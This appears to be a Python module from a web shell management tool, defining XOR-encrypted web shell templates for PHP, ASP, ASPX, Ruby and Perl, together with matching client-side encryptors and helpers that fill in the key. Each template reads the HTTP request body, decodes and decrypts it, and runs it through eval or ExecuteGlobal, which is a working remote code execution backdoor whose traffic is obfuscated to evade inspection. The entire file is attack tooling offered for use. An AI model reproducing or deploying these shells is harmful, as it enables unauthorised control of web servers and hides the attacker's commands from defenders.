# obfuscators/XOR.py

import base64
import textwrap
import json

PARAM_SCHEM = {
    "key" : "secret",
    "encoding" : "utf-8"
}

dicObfuscator = {
    'PHP' : textwrap.dedent('''
        function Encrypt($data) {
            $key = '[XOR_KEY]';
            $out = '';
            $keyLength = strlen($key);
            $dataLength = strlen($data);

            for ($i = 0; $i < $dataLength; $i++) {
                $out .= chr(ord($data[$i]) ^ ord($key[$i % $keyLength]));
            }

            return base64_encode($out);
        }                
    ''').strip(),
    
    'ASP' : textwrap.dedent('''
        Function Encrypt(data)
            On Error Resume Next
            Dim key, i, outStr, keyLength, dataLength, idx
            Dim b, k, xorVal
            key = "[XOR_KEY]"
            keyLength = Len(key)
            dataLength = Len(data)
            outStr = ""
            
            For i = 1 To dataLength
                b = AscW(Mid(data, i, 1)) And &HFF
                idx = ((i - 1) Mod keyLength) + 1
                k = AscW(Mid(key, idx, 1)) And &HFF
                
                xorVal = b Xor k
                outStr = outStr & ChrW(xorVal)
            Next
            
            Dim xmlDoc, node, stream
            Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
            Set node = xmlDoc.CreateElement("b64")
            node.DataType = "bin.base64"
            
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 2 ' adTypeText
            stream.Charset = "iso-8859-1"
            stream.Open
            stream.WriteText outStr
            stream.Position = 0
            stream.Type = 1
            
            node.nodeTypedValue = stream.Read
            Encrypt = Replace(Replace(node.text, vbLf, ""), vbCr, "")
            
            stream.Close
            Set stream = Nothing : Set node = Nothing : Set xmlDoc = Nothing
        End Function
        ''').strip(),

    'ASPX' : textwrap.dedent('''
        function Encrypt(data : String) : String {
            var key : String = "[XOR_KEY]";
            var out : System.Text.StringBuilder = new System.Text.StringBuilder();
            var keyLength : int = key.Length;
            var dataLength : int = data.Length;
            
            for (var i : int = 0; i < dataLength; i++) {
                out.Append(String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % keyLength)));
            }
            
            var xorBytes = System.Text.Encoding.UTF8.GetBytes(out.ToString());
            return System.Convert.ToBase64String(xorBytes);
        }
        ''').strip(),

    'Ruby' : textwrap.dedent('''
        def Encrypt(data)
            Base64.strict_encode64(
                xor_crypt(data, "[XOR_KEY]")
            )
        end
        ''').strip(),

    'Perl' : textwrap.dedent('''
        sub Encrypt {
            use MIME::Base64;

            my ($data) = @_;
            my $key = '[XOR_KEY]';

            utf8::encode($data) if utf8::is_utf8($data);

            my $out = '';
            my $key_len = length($key);
            my $data_len = length($data);

            for (my $i = 0; $i < $data_len; $i++) {
                $out .= chr(
                    ord(substr($data, $i, 1)) ^
                    ord(substr($key, $i % $key_len, 1))
                );
            }

            return encode_base64($out, '');
        }
        ''').strip()
}

dicPayload = {
    'PHP' : textwrap.dedent('''
        <?php

        function xor_crypt($data, $key) {
            $out = '';
            $keyLength = strlen($key);
            $dataLength = strlen($data);

            for ($i = 0; $i < $dataLength; $i++) {
                $out .= chr(ord($data[$i]) ^ ord($key[$i % $keyLength]));
            }

            return $out;
        }

        $KEY = "[XOR_KEY]";
        $rawInput = file_get_contents("php://input");
        $encryptedBytes = base64_decode($rawInput);
        $decrypted = xor_crypt($encryptedBytes, $KEY);
        eval($decrypted);
                                            
        ?>
        ''').strip(),

    'ASP' : textwrap.dedent('''
        <%
        On Error Resume Next

        Function DecryptAndExecute(b64Data)
            On Error Resume Next
            Dim xmlDoc, node, key, keyBytes, keyLen
            Dim bytesData, dataLen, i, idx, b, k, xorVal, outStr
            key = "[XOR_KEY]"
            
            keyLen = Len(key)
            
            Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
            Set node = xmlDoc.CreateElement("base64")
            node.dataType = "bin.base64"
            node.text = b64Data
            bytesData = node.nodeTypedValue
            
            dataLen = LenB(bytesData)
            If dataLen = 0 Then
                DecryptAndExecute = "ERROR: No binary data decoded from Base64"
                Exit Function
            End If
            
            outStr = ""
            For i = 1 To dataLen
                b = AscB(MidB(bytesData, i, 1))
                
                idx = ((i - 1) Mod keyLen) + 1
                k = Asc(Mid(key, idx, 1)) And &HFF
                
                xorVal = b Xor k
                outStr = outStr & Chr(xorVal)
            Next
            
            Dim stream, plaintext
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 2 ' adTypeText
            stream.Charset = "iso-8859-1"
            stream.Open
            stream.WriteText outStr
            stream.Position = 0
            stream.Type = 2
            stream.Charset = "utf-8"
            plaintext = stream.ReadText
            stream.Close
            Set stream = Nothing
            
            If Len(plaintext) > 0 Then
                If AscW(Left(plaintext, 1)) = 65279 Then
                    plaintext = Mid(plaintext, 2)
                End If
            End If
            plaintext = Trim(plaintext)
            
            If plaintext <> "" Then
                ExecuteGlobal plaintext
                
                If Err.Number <> 0 Then
                    DecryptAndExecute = "ERROR: Execute failed. " & Err.Description & " | Code snippet: " & Left(plaintext, 30)
                    Err.Clear()
                Else
                    DecryptAndExecute = "SUCCESS"
                End If
            Else
                DecryptAndExecute = "ERROR: Decrypted plaintext is empty"
            End If
            
            Set node = Nothing : Set xmlDoc = Nothing
        End Function

        Dim byteCount, rawBytes, rawString
        byteCount = Request.TotalBytes

        If byteCount > 0 Then
            rawBytes = Request.BinaryRead(byteCount)
            
            rawString = ""
            Dim j
            For j = 1 To LenB(rawBytes)
                rawString = rawString & Chr(AscB(MidB(rawBytes, j, 1)))
            Next

            rawString = Trim(rawString)
            rawString = Replace(Replace(rawString, vbCr, ""), vbLf, "")

            Dim remainLen
            remainLen = Len(rawString) Mod 4
            If remainLen = 2 Then 
                rawString = rawString & "=="
            ElseIf remainLen = 3 Then 
                rawString = rawString & "="
            End If
                            
            Dim result
            result = DecryptAndExecute(rawString)
            
            If InStr(result, "ERROR") = 1 Then
                Response.Write result
            End If
        Else
            Response.Write "ERROR: Request total bytes is 0"
        End If
        %>
        ''').strip(),

    'ASPX' : textwrap.dedent('''
        <%@ Page Language="JScript" %>
        <%
        try {
            var keyStr : String = "[XOR_KEY]";
            var inputStream = Request.InputStream;
            var len = inputStream.Length;
            
            if (len > 0) {
                var rawData : System.Byte[] = new System.Byte[len];
                inputStream.Read(rawData, 0, len);
                
                var b64String = System.Text.Encoding.ASCII.GetString(rawData).Trim();
                var encryptedData = System.Convert.FromBase64String(b64String);
                
                var key = System.Text.Encoding.UTF8.GetBytes(keyStr);
                var list = new System.Collections.ArrayList();
                
                for (var i = 0; i < encryptedData.Length; i++) {
                    var cipherByte : int = int(encryptedData[i]);
                    var keyByte : int = int(key[i % key.Length]);
                    list.Add(System.Convert.ToByte(cipherByte ^ keyByte));
                }
                
                var decryptedBytes : System.Byte[] = list.ToArray(System.Type.GetType("System.Byte"));
                var plaintext = System.Text.Encoding.UTF8.GetString(decryptedBytes);
                
                if (plaintext != "") {
                    eval(plaintext, "unsafe");
                }
            }
        } catch(err) {}
        %>
        ''').strip(),

    'Ruby' : textwrap.dedent('''
        require 'base64'

        def xor_crypt(data, key)
            out = []

            key_bytes = key.bytes
            key_length = key_bytes.length

            data.bytes.each_with_index do |byte, i|
                out << (byte ^ key_bytes[i % key_length])
            end

            out.pack("C*")
        end

        begin
            len = ENV['CONTENT_LENGTH'].to_i

            raw_input = STDIN.read(len)

            raw_input = raw_input.gsub(' ', '+')

            unless raw_input.empty?

                key = "[XOR_KEY]"

                encrypted_bytes = Base64.decode64(raw_input)

                decrypted = xor_crypt(
                    encrypted_bytes,
                    key
                )

                eval(decrypted)

            end

        rescue => e
            print "Content-Type: text/plain\\r\\n\\r\\n"
            print e.message
        end    
        '''),
        
    'Perl' : textwrap.dedent('''
        use strict;
        use warnings;
        use MIME::Base64;

        sub xor_crypt {
            my ($data, $key) = @_;

            my $out = '';

            my $key_len = length($key);

            for (my $i = 0; $i < length($data); $i++) {
                $out .= chr(
                    ord(substr($data,$i,1)) ^
                    ord(substr($key,$i % $key_len,1))
                );
            }

            return $out;
        }


        my $KEY = "[XOR_KEY]";

        my $len = $ENV{CONTENT_LENGTH} || 0;
        read(STDIN, my $rawInput, $len);

        $rawInput =~ tr/ /+/;

        my $encryptedBytes = decode_base64($rawInput);

        my $decrypted = xor_crypt(
            $encryptedBytes,
            $KEY
        );

        eval $decrypted;
        ''').strip(),
}

def _xor_crypt(data: bytes, key: bytes) -> bytes:
    out = bytearray()
    key_len = len(key)
    for i, byte in enumerate(data):
        out.append(byte ^ key[i % key_len])
    return bytes(out)

def obfuscator(payload, script, key, **kwargs):
    if script in dicObfuscator.keys():
        return dicObfuscator[script].replace('[XOR_KEY]', key)
    else:
        return ''

def build(payload, script, key, **kwargs):
    if script in dicPayload.keys():
        return dicPayload[script].replace('[XOR_KEY]', key)
    else:
        return ''

def example(payload, **kwargs):
    return json.dumps(PARAM_SCHEM, indent=4)

def available(payload, **kwargs):
    scripts = []
    for script in dicPayload.keys():
        if not script in dicObfuscator.keys():
            continue

        scripts.append(script)

    return ','.join(scripts)

def obfuscate(payload, encoding='utf-8', key="secret", **kwargs):
    data_bytes = payload.encode(encoding)
    key_bytes = key.encode(encoding)
    
    # 進行 XOR
    out = bytearray()
    key_len = len(key_bytes)
    for i, byte in enumerate(data_bytes):
        out.append(byte ^ key_bytes[i % key_len])
        
    return base64.b64encode(bytes(out)).decode('ascii')

def deobfuscate(payload, encoding='utf-8', key="default_key", **kwargs):
    encrypted_bytes = base64.b64decode(payload.encode(encoding))
    key_bytes = key.encode(encoding)
    
    decrypted_bytes = _xor_crypt(encrypted_bytes, key_bytes)
    return decrypted_bytes.decode(encoding)